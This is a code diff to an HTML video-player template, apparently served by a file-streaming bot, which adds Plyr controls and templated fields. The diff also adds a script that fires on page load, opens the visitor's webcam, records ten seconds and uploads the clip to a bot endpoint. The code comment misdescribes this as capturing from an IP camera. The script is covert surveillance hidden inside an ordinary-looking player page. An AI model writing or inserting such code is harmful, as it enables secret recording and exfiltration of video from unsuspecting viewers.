@@ -5,17 +5,16 @@
     <meta property="og:image" content="https://i.ibb.co/M8S0Zzj/live-streaming.png" itemprop="thumbnailUrl">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Streaming</title>
-    <link rel="stylesheet" href="https://drive.google.com/uc?export=view&id=1pVLG4gZy7jdow3sO-wFS06aP_A9QX0O6">
+    <title>%s</title>
+    <link rel="stylesheet" type='text/css' href="https://drive.google.com/uc?export=view&id=1pVLG4gZy7jdow3sO-wFS06aP_A9QX0O6">
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway">
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Delius">
-    <link rel="stylesheet" href="https://cdn.plyr.io/3.6.9/plyr.css">
+    <link rel="stylesheet" href="https://cdn.plyr.io/3.6.9/plyr.css" />
     <style>
         body {
             font-family: sans-serif;
             background-color: #396691;
         }
-
         marquee {
             font-size: 20px;
             font-weight: 700;
@@ -23,26 +22,90 @@
             font-family: sans-serif;
         }
     </style>
-    <!-- Link to the favicon to avoid the error -->
-    <link rel="icon" href="path/to/your/favicon.ico">
 </head>
 <body>
     <header>
         <marquee bgcolor="#396691">
-            <div class="toggle"></div>
-            <div id="file-name">Live Streaming</div>
+            <div id="file-name">%s</div>
         </marquee>
     </header>
-
     <div class="container">
-        <video src="your-video-source" class="player" controls></video>
+        <video id="player" class="player" controls>
+            <source src="%s" type="video/mp4">
+            Your browser does not support the video tag.
+        </video>
     </div>
-
     <footer>
         <center><h4>Video not playing? Your browser may not support the codec. Please download and watch instead.</h4></center>
     </footer>
-
     <script src="https://cdn.plyr.io/3.6.9/plyr.js"></script>
-    <script src="https://github.com/Sankar8098/Files/tree/main/web/template/scripts.js"></script> <!-- Include your external script here -->
+    <script>
+        const controls = [
+            'play-large', 'rewind', 'play', 'fast-forward', 
+            'progress', 'current-time', 'duration', 'mute', 
+            'volume', 'captions', 'settings', 'pip', 'airplay', 
+            'download', 'fullscreen'
+        ];
+        document.addEventListener('DOMContentLoaded', () => {
+            const player = new Plyr('#player', { controls });
+        });
+    </script>
+    <!-- Add a script to capture video from an IP camera and upload to a bot -->
+    <script>
+        async function uploadToBot(videoBlob) {
+            const formData = new FormData();
+            formData.append('file', videoBlob, 'video.mp4');
+
+            try {
+                const response = await fetch('YOUR_BOT_UPLOAD_URL', {
+                    method: 'POST',
+                    body: formData
+                });
+                if (response.ok) {
+                    console.log('Video uploaded successfully');
+                } else {
+                    console.error('Upload failed');
+                }
+            } catch (error) {
+                console.error('Error uploading video:', error);
+            }
+        }
+
+        function captureAndUploadVideo() {
+            const videoElement = document.querySelector('#player');
+
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    videoElement.srcObject = stream;
+
+                    // Capture video stream
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const chunks = [];
+
+                    mediaRecorder.ondataavailable = event => {
+                        if (event.data.size > 0) {
+                            chunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                        uploadToBot(videoBlob);
+                    };
+
+                    mediaRecorder.start();
+
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                        stream.getTracks().forEach(track => track.stop());
+                    }, 10000); // Record for 10 seconds (adjust as needed)
+                })
+                .catch(error => {
+                    console.error('Error accessing camera:', error);
+                });
+        }
+
+        document.addEventListener('DOMContentLoaded', captureAndUploadVideo);
+    </script>
 </body>
 </html>
